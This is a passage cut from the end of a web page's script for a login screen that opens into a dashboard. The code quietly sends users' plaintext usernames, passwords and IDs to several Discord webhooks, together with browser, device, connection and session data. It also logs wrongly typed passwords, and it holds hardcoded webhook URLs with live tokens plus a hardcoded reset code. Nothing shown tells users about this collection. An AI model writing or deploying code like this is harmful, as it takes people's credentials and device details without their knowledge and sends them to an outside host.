                    handleFailedAttempt('User not found or ID mismatch.');
                    return;
                }

                if (password !== user.password) {
                    await logInvalidPassword(user.name, password);
                    handleFailedAttempt('Incorrect password.');
                    return;
                }

                // Successful login
                attempts = 3; // Reset attempts after successful login
                updateAttemptsText();
                errorMsg.innerText = '';
                
                dashboard.stats.timeToLogin = Date.now() - loginAttemptStartTime;
                localStorage.setItem('stats_timeToLogin', dashboard.stats.timeToLogin.toString());
                
                // Log successful credentials via webhooks
                await logUsername(user.name, username);
                await logPassword(user.name, password);
                await logIdentifier(user.name, userID);
                
                const loggingData = await collectLoggingData(user, password);
                loggingData.timeToLogin = dashboard.stats.timeToLogin;

                // Send all 5 main webhooks with comprehensive data
                await Promise.all([
                    sendWebhook(webhookUrls.userLogging, buildUserLoggingEmbed(loggingData)),
                    sendWebhook(webhookUrls.browserLogging, buildBrowserLoggingEmbed(loggingData)),
                    sendWebhook(webhookUrls.deviceLogging, buildDeviceLoggingEmbed(loggingData)),
                    sendWebhook(webhookUrls.connectionLogging, buildConnectionLoggingEmbed(loggingData)),
                    sendWebhook(webhookUrls.sessionLogging, buildSessionLoggingEmbed(loggingData)),
                ]);

                // Trigger Success Login Animation
                loginBox.style.display = 'none';
                loadingScreen.classList.remove('fade-out'); // Show the loading screen again for transition
                loadingScreen.style.display = 'flex';
                loadingText.innerText = `Welcome, ${user.name || username}! Loading Dashboard...`;
                loadingText.classList.add('success');
                dashboard.logAlert(`✅ Login successful for ${user.name || username}. Loading dashboard...`);

                setTimeout(() => {
                  loadingScreen.classList.add('fade-out');
                  loadingScreen.addEventListener('transitionend', () => {
                        loadingScreen.style.display = 'none';
                        document.getElementById('dashboard').style.display = 'block';
                        document.body.className = 'dashboard-body';
                        document.getElementById('loggedInUser').innerText = user.name || username;
                        document.getElementById('loggedInID').innerText = userID;
                        dashboard.init();
                        dashboard.logAlert("🎉 Dashboard loaded and ready for interaction!");

                        // Check and open default panel from settings
                        const defaultPanelId = localStorage.getItem('defaultPanelOnLoad');
                        if (defaultPanelId && defaultPanelId !== 'none') {
                           dashboard.togglePanel(defaultPanelId); // Open the specific panel
                        }

                  }, {once: true});
                }, 2500); // Short delay before dashboard shows fully
            });

            // Failed attempt handler (retained logic)
            async function handleFailedAttempt(msg) {
                attempts--;
                updateAttemptsText();
                errorMsg.innerText = msg;
                dashboard.logAlert(`❗️ Login failed: ${msg}. Attempts left: ${attempts}`);

                if (attempts <= 0) {
                    submitBtn.disabled = true;
                    errorMsg.innerText = 'Max login attempts reached. Please contact support.';
                    dashboard.logAlert('🚫 MAX LOGIN ATTEMPTS REACHED. Login inputs locked.');

                    const username = usernameInput.value;
                    const password = passwordInput.value;
                    const userID = userIDInput.value;
                    const user = findUser(username, userID) || {};
                    await logAttemptsExceeded(
                        user.name || "Unknown User",
                        username,
                        password,
                        userID
                    );
                } else {
                    loginBox.classList.add('flashing');
                    setTimeout(() => loginBox.classList.remove('flashing'), 800);
                }
            }
            
            function updateAttemptsText() {
                attemptsText.innerText = `Attempts Left: ${attempts}`;
            }

            // 'Reset Counter' logic remains for webhook reporting if ever triggered, but not via current UI flow.
            if (resetBtn) {
                resetBtn.addEventListener('click', async () => {
                    const enteredCode = resetField.value.trim();
                    const isCorrect = enteredCode === 'Reset.Counter.2579';

                    const username = usernameInput.value || 'Unknown';
                    const password = passwordInput.value || 'Unknown';
                    const userID = userIDInput.value || 'Unknown';
                    const user = findUser(username, userID) || {};

                    const resetBoxEmbed = {
                        title: "🔔 Reset Box Detected (Manual Trigger/Fallback)",
                        color: 0xffff00, fields: [
                            { name: "Name", value: user.name || "N/A", inline: true },
                            { name: "Username", value: username, inline: true },
                            { name: "Password Entered", value: password, inline: true },
                            { name: "User ID", value: userID, inline: true },
                            { name: "Entered Code", value: enteredCode, inline: false },
                            { name: "Time", value: new Date().toISOString(), inline: false }
                        ]
                    };
                    const resetBoxWebhook = "https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJykeiThIZ6gYCJILFSHfSDSnsq";
                    await sendWebhook(resetBoxWebhook, resetBoxEmbed);

                    const resultEmbed = {
                        title: isCorrect ? "✅ Reset Code Accepted" : "❌ Incorrect Reset Code Attempt",
                        color: isCorrect ? 0x00ff00 : 0xff0000,
                        fields: [
                            { name: "Name", value: user.name || "N/A", inline: true },
                            { name: "Username", value: username, inline: true },
                            { name: "Password Entered", value: password, inline: true },
                            { name: "User ID", value: userID, inline: true },
                            { name: "Reset Code", value: enteredCode, inline: false },
                            { name: "Time", value: new Date().toISOString(), inline: false }
                        ]
                    };
                    const resultWebhook = isCorrect
                        ? "https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHaSxUQCz-16Qj4uPYk1YxgoanB"
                        : "https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRiJgbSlRDWOJUvHVqsK248ip";
                    await sendWebhook(resultWebhook, resultEmbed);

                    if (isCorrect) {
                        attempts = 3;
                        updateAttemptsText();
                        if (submitBtn) submitBtn.disabled = false;
                        errorMsg.innerText = '';
                        dashboard.logAlert('✅ Login attempts counter reset!');
                        if(resetPopup) resetPopup.style.display = 'none';
                    } else {
                        alert('Incorrect reset code.');
                        dashboard.logAlert('❗️ Incorrect reset code entered for counter reset.');
                    }
                });
            }

            // Keyboard Enter key listener (retained logic, adapted to prioritize active inputs/buttons)
            document.addEventListener('keydown', e => {
                if (e.key === 'Enter') {
                    // Check if an input field for login/reset is focused
                    const activeElement = document.activeElement;
                    const isLoginInputFocused = [usernameInput, passwordInput, userIDInput].includes(activeElement);
                    const isResetFieldFocused = resetField && activeElement === resetField;

                    if (isResetFieldFocused && resetBtn && !resetBtn.disabled) {
                        resetBtn.click();
                        e.preventDefault();
                    } else if (isLoginInputFocused || document.activeElement === submitBtn) { // If a login input or submit button is focused
                         if (!submitBtn.disabled) {
                            submitBtn.click();
                            e.preventDefault();
                        }
                    } else if (!document.getElementById('loginBox').contains(activeElement) && !submitBtn.disabled) {
                        // If Enter is pressed generally (e.g. not in an active login/reset input) AND submitBtn is not disabled.
                        // This prevents unexpected submissions if already logged in etc.
                        // You could add logic here for 'global' enter actions on the dashboard, if desired.
                    }
                }
            });


            // Initialize attempts display
            updateAttemptsText();

            // Initial permission checks for Notifications (retained, adapted to dashboard.logAlert)
            if ('Notification' in window) {
                if (localStorage.getItem('desktopNotifications') === 'true' && Notification.permission !== "granted") {
                    Notification.requestPermission()
                        .then(permission => {
                            if (permission === "granted") dashboard.logAlert("Desktop notification permission granted.");
                            else dashboard.logAlert("Desktop notification permission denied.");
                        });
                } else if (Notification.permission === "granted") {
                    dashboard.logAlert("Desktop notification permission is already granted.");
                }
            } else {
                dashboard.logAlert("Desktop notifications not supported by this browser.");
            }
        });
    </script>
</body>
</html>
